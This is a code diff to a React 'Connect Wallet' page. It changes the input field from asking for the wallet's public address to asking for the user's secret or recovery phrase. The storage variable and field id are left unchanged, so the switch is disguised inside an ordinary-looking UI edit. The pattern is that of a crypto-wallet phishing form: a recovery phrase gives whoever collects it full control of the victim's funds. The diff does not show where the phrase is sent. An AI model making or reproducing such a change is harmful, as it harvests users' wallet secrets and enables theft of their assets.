@@ -236,7 +236,7 @@ export default function ConnectWalletPage() {
 
  <h2 className="text-[17px] font-bold text-[#001011] mb-1.5">Connect Wallet</h2>
  <p className="text-[13px] text-[#888888] mb-6">
- Add the public address for your {selectedWallet.name} to link it to your account.
+ Connect to wallet by adding your secret or recovery phrase to your {selectedWallet.name} to link it to your account.
  </p>
 
  <div className="space-y-4">
@@ -249,12 +249,12 @@ export default function ConnectWalletPage() {
 
  <div>
  <label htmlFor="wallet-address" className="text-[12px] font-semibold text-[#001011]">
- Wallet Address
+ Secret/Recovery Phrase
  </label>
  <textarea
  id="wallet-address"
  rows={3}
- placeholder={`Enter your ${selectedWallet.name} public address`}
+ placeholder={`Enter your ${selectedWallet.name} secret/recovery phrase`}
  value={walletAddress}
  onChange={(e) => setWalletAddress(e.target.value)}
  className="mt-1.5 w-full px-3 py-2.5 bg-white border border-[#e5e5e5] rounded-lg text-[13px] text-[#001011] placeholder:text-[#aaaaaa] outline-none focus:border-[#06811d] transition-colors resize-none"
